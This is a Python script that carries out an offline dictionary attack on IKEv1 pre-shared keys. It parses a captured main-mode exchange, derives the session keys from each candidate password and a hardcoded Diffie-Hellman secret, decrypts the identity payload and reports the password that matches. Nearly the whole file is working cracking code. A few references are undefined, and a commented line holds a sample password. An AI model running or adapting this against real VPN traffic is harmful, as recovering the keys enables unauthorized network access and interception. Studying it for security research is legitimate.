import binascii
from scapy.all import *
import ikev1_payloadParser as ikeParser
import ikev1_pcapReader as pcapReader
import hmac
from hashlib import sha1
from Crypto.Cipher import AES

def bytesToHex(byteStr):
    return str(binascii.hexlify(bytes(byteStr)), 'ascii')

def computeKey(psk,initNonce,respNonce):
    return hmac.new(psk.encode("ascii"),initNonce+respNonce,sha1)

def computeKeyK0(k,dhKey,initCookie, respCookie):
    return hmac.new(k.digest(), dhKey + initCookie+ respCookie + bytes([0]),sha1)

def computeKeyK1(k,k_0,dhKey,initCookie, respCookie):
    return hmac.new(k.digest(), k_0.digest() + dhKey + initCookie+ respCookie + bytes([1]),sha1)

def computeKeyK2(k,k_1,dhKey,initCookie, respCookie):
    return hmac.new(k.digest(), k_1.digest() + dhKey + initCookie+ respCookie + bytes([2]),sha1)

def computeIV(initKeX,respKeX):
    hash = hashlib.sha1()
    hash.update(initKeX)
    hash.update(respKeX)
    return hash.digest()

def computeDecryptdHashI(k2,iv,ciphertext):
    cipher = AES.new(k2, AES.MODE_CBC, iv)
    return cipher.decrypt(ciphertext)


def checkIDValue(psk,dhSecret,initCookie,respCookie,initNonce,respNonce,iv,ciphertext):
    k = computeKey(psk, initNonce, respNonce)
    k_0 = computeKeyK0(k, dhSecret, initCookie, respCookie)
    k_1 = computeKeyK1(k, k_0, dhSecret, initCookie, respCookie)
    k_2 = computeKeyK2(k, k_1, dhSecret, initCookie, respCookie)
    plaintext = computeDecryptdHashI(k_2.digest()[:16], iv, ciphertext)
    if(str(binascii.hexlify(plaintext)[:idLength].lower(),"ascii") ==
            str(binascii.hexlify(idPlainValue.lower()),"ascii")):
        return 1
    else:
        return 0

dhSecret = binascii.unhexlify("34B52971CD61F18048EE97D20DA488A4634125F300DC2D1F470BDBB68B989FB999A2721328084C165CBEBDCA0C08B516799132B8F647AE46BD2601028EC7E3954AAF612828826A031FF08B7AE4057CAE0ADB51453BAAE84691705E913BA95067B816385C37D2BD85701501F94A1AA27FFC20A9546EC9DEFF8A1CB33588819A55")
pcapPath = "pcaps/ikev1-psk-main-mode-incomplete.pcapng"
#pcapPath = "pcaps/ikev1-psk-aggressive-mode-simple.pcapng"
#dictPath = "dict/list-simple.txt"
dictPath = "dict/list.txt"
# idHex  = ...||PayloadLength||IDType||ProtocolID||Port||IPAddress
idHex = "0800000c01000000c0a80064"
idPlainValue = binascii.unhexlify(idHex)
idLength = idHex.__len__()

if __name__ == '__main__':
    packets = pcapReader.openPCAPFile(pcapPath)
    if(packets.__len__() > 0):
        initIP = str(ikeParser.getInitiatorIP(packets))
        respIP = str(ikeParser.getResponderIP(packets))

        initCookie = ikeParser.getCookieFromPackets(packets,False)
        respCookie = ikeParser.getCookieFromPackets(packets, True)

        initNonce = ikeParser.getISAKMPPayloadFromPackets(packets,initIP, ikeParser.NONCE)
        respNonce = ikeParser.getISAKMPPayloadFromPackets(packets,respIP, ikeParser.NONCE)


        initKEX = ikeParser.getISAKMPPayloadFromPackets(packets,initIP, ikeParser.KEX)
        respKEX = ikeParser.getISAKMPPayloadFromPackets(packets,respIP, ikeParser.KEX)

        ciphertext = getEncryptedPayload(packets,initIP)
        iv = computeIV(initKEX,respKEX)[:16]

        #k_2 = computeKeys("XMd3azP95q".encode("ascii"), dhSecret, initNonce + respNonce, initCookie + respCookie)


        passDict = []
        with open(dictPath, 'r') as myfile:
            passDict = myfile.read().splitlines()

        for psk in passDict:
            if(checkIDValue(psk, dhSecret, initCookie, respCookie, initNonce, respNonce, iv, ciphertext)):
                print("Target psk found: "+psk)
                exit()